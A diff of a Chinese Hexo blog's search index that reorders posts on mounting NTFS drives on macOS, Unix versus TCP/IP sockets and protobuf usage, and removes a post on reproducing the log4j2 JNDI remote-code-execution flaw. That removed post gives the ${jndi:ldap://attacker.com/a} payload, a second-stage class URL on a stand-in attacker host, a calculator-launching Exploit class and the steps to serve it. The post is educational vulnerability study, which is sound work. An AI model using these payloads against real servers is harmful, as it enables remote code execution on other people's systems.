+<li>现在你看到了一个编辑界面，输入LABEL=AngleDisk none ntfs rw,auto,nobrowse后，敲击回车，再Ctrl+X，再敲击Y，再敲击回车</li>
+<li>此时，退出你的移动硬盘，再重新插入，你会发现磁盘没有显示在桌面或是Finder之前出现的地方，别慌</li>
+<li>打开Finder，Command+Shift+G，输入框中输入/Volumes，回车，你就可以看到你的磁盘啦！是可以读写的哟，Enjoy</li>
+<li>方便起见，你可以直接把磁盘拖到Finder侧边栏中，这样下次使用就不用进入到/Volumes目录打开le</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/19571334">https://www.zhihu.com/question/19571334</a></p>
 ]]></content>
       <categories>
-        <category>java进阶</category>
+        <category>101</category>
       </categories>
       <tags>
-        <tag>protobuf</tag>
-        <tag>proto</tag>
+        <tag>mac</tag>
+        <tag>ntfs</tag>
       </tags>
   </entry>
   <entry>
@@ -1243,6 +1236,26 @@
         <tag>reactor</tag>
         <tag>nio</tag>
         <tag>netty</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Unix socket 与 TCP/IP socket 的区别</title>
+    <url>/unix-socket-and-tcp-ip-socket.html</url>
+    <content><![CDATA[<h2 id="Unix-socket"><a href="#Unix-socket" class="headerlink" title="Unix socket"></a>Unix socket</h2><p>又叫 IPC（inter-process communication 进程间通信） socket，用于实现同一主机上的进程间通信。通过监听 path（Unix 文件系统路径） 而不是 port。直接将应用层数据从一个进程拷贝到另一个进程，不需要经过网络层（检查、路由等），因此比 IP socket 效率更高。</p>
+<p>MySQL 对此特性的优化，如果发现地址是 localhost，就会使用 unix 套接字来提升性能。具体参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/connecting.html">https://dev.mysql.com/doc/refman/8.0/en/connecting.html</a></p>
+<p>通过以下命令来列出本机 Unix socket</p>
+<p>Linux: <code>netstat -a -p --unix</code></p>
+<p>Mac: <code>netstat -a -f unix</code></p>
+<p>Windows: 没有 Unix socket，有个类似的机制叫做 <strong>Named pipes</strong>。win10 支持 Unix socket，有一些限制，具体参考：<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/</a></p>
+<h2 id="TCP-IP-socket"><a href="#TCP-IP-socket" class="headerlink" title="TCP/IP socket"></a>TCP/IP socket</h2><p>进程间网络通信机制，也可以实现同一主机进程通信（通过使用环回接口）。一个 IP socket connection 由 &lt;local IP, local port, remote IP and remote port&gt; 唯一标识。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets">https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets</a></p>
+]]></content>
+      <categories>
+        <category>计算机网络</category>
+      </categories>
+      <tags>
+        <tag>socket</tag>
+        <tag>tcp</tag>
       </tags>
   </entry>
   <entry>
@@ -1304,6 +1317,45 @@
         <tag>源码</tag>
         <tag>spring</tag>
         <tag>threadlocal</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>protobuf 安装使用</title>
+    <url>/protobuf-use.html</url>
+    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
+<li><p>官网下载 <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
+</li>
+<li><p>解压，cd 到目录下</p>
+</li>
+<li><p>./configure</p>
+</li>
+<li><p>make</p>
+</li>
+<li><p>make check</p>
+</li>
+<li><p>sudo make install</p>
+</li>
+<li><p>which protoc</p>
+</li>
+<li><p>protoc –version</p>
+<span id="more"></span></li>
+</ul>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="编写proto文件（idl文件）"><a href="#编写proto文件（idl文件）" class="headerlink" title="编写proto文件（idl文件）"></a>编写proto文件（idl文件）</h3><p>一个名为 Person.proto文件如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax=&quot;proto3&quot;; </span><br><span class="line">option java_package = &quot;org.serialization.protobuf.quickstart&quot;;   </span><br><span class="line">option java_outer_classname = &quot;PersonProtobuf&quot;;   </span><br><span class="line">message Person  &#123;   </span><br><span class="line">  int32 age = 1;</span><br><span class="line">  string name = 2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 protoc 编译器，将 proto 文件编译成 java 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc --java_out=./ Person.proto</span><br></pre></td></tr></table></figure>
+
+<h3 id="序列化调用"><a href="#序列化调用" class="headerlink" title="序列化调用"></a>序列化调用</h3><p>引入 maven 依赖</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.google.protobuf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>protobuf-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>java进阶</category>
+      </categories>
+      <tags>
+        <tag>protobuf</tag>
+        <tag>proto</tag>
       </tags>
   </entry>
   <entry>
@@ -1370,26 +1422,6 @@
       </categories>
       <tags>
         <tag>红白机</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Unix socket 与 TCP/IP socket 的区别</title>
-    <url>/unix-socket-and-tcp-ip-socket.html</url>
-    <content><![CDATA[<h2 id="Unix-socket"><a href="#Unix-socket" class="headerlink" title="Unix socket"></a>Unix socket</h2><p>又叫 IPC（inter-process communication 进程间通信） socket，用于实现同一主机上的进程间通信。通过监听 path（Unix 文件系统路径） 而不是 port。直接将应用层数据从一个进程拷贝到另一个进程，不需要经过网络层（检查、路由等），因此比 IP socket 效率更高。</p>
-<p>MySQL 对此特性的优化，如果发现地址是 localhost，就会使用 unix 套接字来提升性能。具体参考：<a href="https://dev.mysql.com/doc/refman/8.0/en/connecting.html">https://dev.mysql.com/doc/refman/8.0/en/connecting.html</a></p>
-<p>通过以下命令来列出本机 Unix socket</p>
-<p>Linux: <code>netstat -a -p --unix</code></p>
-<p>Mac: <code>netstat -a -f unix</code></p>
-<p>Windows: 没有 Unix socket，有个类似的机制叫做 <strong>Named pipes</strong>。win10 支持 Unix socket，有一些限制，具体参考：<a href="https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/">https://devblogs.microsoft.com/commandline/af_unix-comes-to-windows/</a></p>
-<h2 id="TCP-IP-socket"><a href="#TCP-IP-socket" class="headerlink" title="TCP/IP socket"></a>TCP/IP socket</h2><p>进程间网络通信机制，也可以实现同一主机进程通信（通过使用环回接口）。一个 IP socket connection 由 &lt;local IP, local port, remote IP and remote port&gt; 唯一标识。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets">https://serverfault.com/questions/124517/what-is-the-difference-between-unix-sockets-and-tcp-ip-sockets</a></p>
-]]></content>
-      <categories>
-        <category>计算机网络</category>
-      </categories>
-      <tags>
-        <tag>socket</tag>
-        <tag>tcp</tag>
       </tags>
   </entry>
   <entry>
@@ -1547,38 +1579,6 @@
         <tag>源码</tag>
         <tag>lock</tag>
         <tag>synchronized</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>log4j2 远程执行漏洞原理与复现</title>
-    <url>/log4j2-rce.html</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
-<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
-<p>黑客服务器（ladp + http）</p>
-<p>从该请求中注入字符串的日志语句</p>
-<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
-<li>发送包含恶意字符串的请求（通过任何协议）</li>
-<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
-<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
-<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
-<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
-</ol>
-<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
-<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>会在 mac 系统上启动计算器</p>
-<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
-<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
-<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
-<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
-]]></content>
-      <tags>
-        <tag>log4j</tag>
-        <tag>rce</tag>
       </tags>
   </entry>
 </search>
